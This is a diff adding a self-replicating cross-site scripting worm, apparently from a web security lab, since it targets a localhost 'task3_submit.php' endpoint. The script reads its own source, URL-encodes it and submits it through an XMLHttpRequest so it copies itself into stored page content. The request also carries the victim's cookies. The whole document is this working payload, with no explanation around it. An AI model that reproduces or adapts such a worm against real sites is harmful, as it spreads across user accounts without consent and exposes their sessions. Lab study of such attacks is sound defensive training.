@@ -1,0 +1,28 @@
+<script id=worm>
+    var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
+    var jsCode = document.getElementById("worm").innerHTML;
+    var tailTag = "</" + "script>";
+    var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
+    
+    var xhr = new XMLHttpRequest();
+
+    var url = 'http://localhost/task3_submit.php?content=';
+    var contenturl = wormCode;
+    var endingbit = '&submit=submit';
+
+    var fullurl = url + contenturl + endingbit;
+
+    xhr.open('GET', fullurl, true);
+
+    xhr.setRequestHeader("Cookie",document.cookie);
+    xhr.onload = function() {
+        if (xhr.status===200){
+            console.log(xhr.responseText);
+        }else{
+            console.log('failed' + xhr.status);
+        }
+    };
+
+    xhr.send();
+
+</script>
